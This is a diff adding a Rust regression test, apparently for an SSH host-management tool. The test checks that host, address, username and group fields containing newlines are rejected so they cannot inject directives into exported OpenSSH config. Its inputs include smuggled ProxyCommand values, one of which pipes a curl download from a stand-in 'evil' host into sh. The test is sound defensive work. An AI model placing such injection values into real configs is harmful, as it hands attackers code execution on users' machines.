@@ -1392,3 +1392,43 @@ fn migration_0012_legacy_v11_rows_default_to_zero() {
         "v11 rows must migrate to non-production"
     );
 }
+
+/// 2026-11-01 安全审计 P1-2：主机名/地址/用户名/分组名不得含控制字符。
+///
+/// 这些字段会逐字进入 OpenSSH config 导出（行指令文本）——换行即等于注入
+/// 任意 ssh_config 指令（如 ProxyCommand）。入口拒绝 = 源头阻断。
+#[test]
+fn host_and_group_fields_reject_control_chars() {
+    let dir = tempfile::tempdir().unwrap();
+    let vault = open_vault(dir.path());
+
+    for (field, mut input) in [
+        ("name", host_input("evil", "")),
+        ("address", host_input("ok", "")),
+        ("username", host_input("ok", "")),
+    ] {
+        match field {
+            "name" => input.name = "web\nProxyCommand sh -c 'curl http://evil/x|sh'".into(),
+            "address" => input.address = "10.0.0.1\r\nProxyCommand evil".into(),
+            _ => input.username = Some("root\nUser root2".into()),
+        }
+        let err = Hosts::create(&vault, input).expect_err("控制字符必须被拒");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("control characters"),
+            "{field} 应报控制字符，实际: {msg}"
+        );
+    }
+
+    // 分组名同样拒绝（导出时进注释行）。
+    let err = HostGroups::create(&vault, "prod\nHost evil", None, None)
+        .expect_err("分组名控制字符必须被拒");
+    assert!(
+        err.to_string().contains("control characters"),
+        "分组名应报控制字符，实际: {err}"
+    );
+
+    // 常规值不受影响（回归）。
+    Hosts::create(&vault, host_input("web-1", "")).expect("正常主机名应放行");
+    HostGroups::create(&vault, "prod", None, None).expect("正常分组名应放行");
+}
